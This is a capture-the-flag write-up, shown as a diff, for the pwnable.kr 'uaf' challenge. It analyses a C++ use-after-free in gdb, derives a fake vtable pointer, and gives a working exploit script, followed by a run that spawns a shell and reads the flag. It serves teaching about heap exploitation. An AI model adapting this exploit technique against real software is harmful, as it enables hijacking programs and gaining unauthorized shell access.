@@ -1,0 +1,162 @@
+This challenge is a bit tricky. The vulnerability in this challenge is use-after-free. Source code is given and the binary itself. However, we rather analyze the binary since it is required a lot of memory inspection.
+
+Quick recap of the source code, we noticed the developer provide system shell in the code itself. Which means if we successfully get a pointer to that function, we can actually execute the system shell. The code itself implemented in the class "Human".
+
+class Human{
+private:
+	virtual void give_shell(){
+		system("/bin/sh");
+	}
+protected:
+	int age;
+	string name;
+public:
+	virtual void introduce(){
+		cout << "My name is " << name << endl;
+		cout << "I am " << age << " years old" << endl;
+	}
+};
+
+
+Second thing that come up in our mind is the main() function. In the switch case 1, we can see the implementation:
+
+	case 1:
+		m->introduce();
+		w->introduce();
+
+
+To inspect this in memory, we put breakpoint on the offset 0x0000000000400fcd. 
+
+   0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
+   ...
+   gdb-peda$ br *main+265
+   Breakpoint 1 at 0x400fcd
+
+
+Then we run the program and choose the menu '1'.
+
+gdb-peda$ r
+Starting program: /home/yuri/pwnable_kr/uaf/uaf 
+1. use
+2. after
+3. free
+1
+
+ [----------------------------------registers-----------------------------------]
+RAX: 0x1 
+RBX: 0xb8e090 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
+RCX: 0xa ('\n')
+RDX: 0xa ('\n')
+RSI: 0x0 
+RDI: 0x2b70ae2d13c0 --> 0x0 
+RBP: 0x7ffede0ef180 --> 0x0 
+RSP: 0x7ffede0ef120 --> 0x7ffede0ef268 --> 0x7ffede0f0294 ("/home/yuri/pwnable_kr/uaf/uaf")
+RIP: 0x400fcd (<main+265>:	mov    rax,QWORD PTR [rbp-0x38])
+R8 : 0xa ('\n')
+R9 : 0x2b70adde40c0 (0x00002b70adde40c0)
+R10: 0x7ffede0eedd0 --> 0x0 
+R11: 0x2b70ae088340 (<_ZNSs4_Rep10_M_disposeERKSaIcE>:	cmp    rdi,QWORD PTR [rip+0x232789]        # 0x2b70ae2baad0)
+R12: 0x7ffede0ef140 --> 0xb8e078 --> 0x6c6c694a ('Jill')
+R13: 0x7ffede0ef260 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400fc3 <main+255>:	cmp    eax,0x1
+   0x400fc6 <main+258>:	je     0x400fcd <main+265>
+   0x400fc8 <main+260>:	jmp    0x4010a9 <main+485>
+=> 0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
+   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
+   0x400fd4 <main+272>:	add    rax,0x8
+   0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
+   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffede0ef120 --> 0x7ffede0ef268 --> 0x7ffede0f0294 ("/home/yuri/pwnable_kr/uaf/uaf")
+0008| 0x7ffede0ef128 --> 0x10000ffff 
+0016| 0x7ffede0ef130 --> 0xb8e028 --> 0x6b63614a ('Jack')
+0024| 0x7ffede0ef138 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
+0032| 0x7ffede0ef140 --> 0xb8e078 --> 0x6c6c694a ('Jill')
+0040| 0x7ffede0ef148 --> 0xb8e040 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
+0048| 0x7ffede0ef150 --> 0xb8e090 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
+0056| 0x7ffede0ef158 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0000000000400fcd in main ()
+
+
+Our program stopped at the offset that we put breakpoint. In the stack itself we can see the execution of the function "give_shell". 
+
+0048| 0x7ffede0ef150 --> 0xb8e090 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
+
+
+Pointer to the "give_shell":
+
+gdb-peda$ x/3x 0x401550
+0x401550 <_ZTV5Woman+16>:	0x0040117a	0x00000000	0x00401376
+gdb-peda$ x/10xi 0x0040117a
+   0x40117a <_ZN5Human10give_shellEv>:	push   rbp
+   0x40117b <_ZN5Human10give_shellEv+1>:	mov    rbp,rsp
+   0x40117e <_ZN5Human10give_shellEv+4>:	sub    rsp,0x10
+   0x401182 <_ZN5Human10give_shellEv+8>:	mov    QWORD PTR [rbp-0x8],rdi
+   0x401186 <_ZN5Human10give_shellEv+12>:	mov    edi,0x4014a8
+   0x40118b <_ZN5Human10give_shellEv+17>:	call   0x400cc0 <system@plt>
+   0x401190 <_ZN5Human10give_shellEv+22>:	leave  
+   0x401191 <_ZN5Human10give_shellEv+23>:	ret      
+
+
+This is the interesting part since we need to know which offset we can use to jump into 0x40118b (call function) which will execute system shell for us. If we look carefully in the code executed (still on breakpoint), we can see it will add 0x8 into RAX. 
+
+   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]		; copy rbp-0x38 to RAX
+   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]			; copy itself
+   0x400fd4 <main+272>:	add    rax,0x8                      ; add 0x8 into RAX
+   
+
+Thus, we can exploit the program as in following:
+
+pointer give_shell      give_shell offset
+ [0x401550 - 0x8]  --->   [0x0040117a]
+
+
+ Our working exploit as in the following:
+
+ #!/bin/bash
+
+# this used to generate exploit (pointer to execute the shell)
+python -c "print '\x48\x15\x40\x00'" > exploit
+echo "[+] Generating payload"
+echo "[+] Program UAF should run now"
+echo "[+] To execute shell, in the menu, you're only allowed to enter value 4 times. The sequence are: 3 2 2 1"
+./uaf 3 ./exploit
+
+
+Example successful exploitation:
+
+uaf@ubuntu:/tmp/kimak$ mkdir /tmp/.is;cd /tmp/.is
+uaf@ubuntu:/tmp/.is$ vim code.sh
+uaf@ubuntu:/tmp/.is$ vim code.sh
+uaf@ubuntu:/tmp/.is$ chmod +x code.sh 
+uaf@ubuntu:/tmp/.is$ ./code.sh 
+[+] Generating payload
+[+] Program UAF should run now
+[+] To execute shell, in the menu, you're only allowed to enter value 4 times. The sequence are: 3 2 2 1
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+$ cat /home/uaf/flag
+yay_f1ag_<removed>
